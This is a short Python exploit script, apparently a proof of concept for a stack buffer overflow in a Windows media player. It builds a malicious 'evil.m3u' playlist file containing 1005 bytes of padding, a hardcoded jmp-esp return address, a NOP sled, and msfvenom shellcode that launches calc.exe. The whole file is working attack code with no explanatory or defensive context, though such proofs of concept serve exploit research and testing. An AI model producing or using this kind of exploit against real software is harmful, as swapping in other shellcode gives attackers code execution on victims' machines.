#!/usr/bin/env python3

from pwn import *


padding = b'\x41' * 1005
nops =    b'\x90' * 64

# msfvenom -p windows/exec -b '\x00\x09\x0a\x1a' -f py CMD=calc.exe
shellcode =  b""
shellcode += b"\xda\xd5\xba\x67\xf0\xce\x98\xd9\x74\x24\xf4\x5e\x31"
shellcode += b"\xc9\xb1\x31\x31\x56\x18\x83\xee\xfc\x03\x56\x73\x12"
shellcode += b"\x3b\x64\x93\x50\xc4\x95\x63\x35\x4c\x70\x52\x75\x2a"
shellcode += b"\xf0\xc4\x45\x38\x54\xe8\x2e\x6c\x4d\x7b\x42\xb9\x62"
shellcode += b"\xcc\xe9\x9f\x4d\xcd\x42\xe3\xcc\x4d\x99\x30\x2f\x6c"
shellcode += b"\x52\x45\x2e\xa9\x8f\xa4\x62\x62\xdb\x1b\x93\x07\x91"
shellcode += b"\xa7\x18\x5b\x37\xa0\xfd\x2b\x36\x81\x53\x20\x61\x01"
shellcode += b"\x55\xe5\x19\x08\x4d\xea\x24\xc2\xe6\xd8\xd3\xd5\x2e"
shellcode += b"\x11\x1b\x79\x0f\x9e\xee\x83\x57\x18\x11\xf6\xa1\x5b"
shellcode += b"\xac\x01\x76\x26\x6a\x87\x6d\x80\xf9\x3f\x4a\x31\x2d"
shellcode += b"\xd9\x19\x3d\x9a\xad\x46\x21\x1d\x61\xfd\x5d\x96\x84"
shellcode += b"\xd2\xd4\xec\xa2\xf6\xbd\xb7\xcb\xaf\x1b\x19\xf3\xb0"
shellcode += b"\xc4\xc6\x51\xba\xe8\x13\xe8\xe1\x66\xe5\x7e\x9c\xc4"
shellcode += b"\xe5\x80\x9f\x78\x8e\xb1\x14\x17\xc9\x4d\xff\x5c\x25"
shellcode += b"\x04\xa2\xf4\xae\xc1\x36\x45\xb3\xf1\xec\x89\xca\x71"
shellcode += b"\x05\x71\x29\x69\x6c\x74\x75\x2d\x9c\x04\xe6\xd8\xa2"
shellcode += b"\xbb\x07\xc9\xc0\x5a\x94\x91\x28\xf9\x1c\x33\x35"

payload = flat(
    padding,
    p32(0x1010539f), # jmp esp;
    nops, shellcode
)

with open('evil.m3u', 'wb') as fp:
    fp.write(b'http://%s' % payload)

